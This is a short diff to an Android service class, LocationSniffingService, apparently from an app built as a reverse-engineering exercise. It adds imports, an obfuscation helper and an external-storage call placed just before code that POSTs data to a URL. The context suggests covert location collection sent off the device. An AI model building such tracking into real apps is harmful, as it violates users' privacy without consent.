@@ -5,8 +5,11 @@ import android.content.Intent;
 import android.location.Location;
 import android.os.Build;
 import android.os.Debug;
+import android.os.Environment;
 import android.os.IBinder;
 import android.util.Log;
+
+import com.woop.tryreverseengineerthis.helper.PictureObfuscate;
 import com.woop.tryreverseengineerthis.helper.StringHelper;
 import com.woop.tryreverseengineerthis.storage.LocationStorage;
 import java.io.DataOutputStream;
@@ -56,7 +59,6 @@ public class LocationSniffingService extends Service{
                     thisAlsoDoesnotDoAnything();
             }
         }, 0,delay);
-
 
     }
 
@@ -116,6 +118,8 @@ public class LocationSniffingService extends Service{
                 e.printStackTrace();
                 return;
             }
+
+            Environment.getExternalStorageDirectory();
 
             URL url = new URL(urlString);
             byte[] postData = s.getBytes(StandardCharsets.UTF_8);
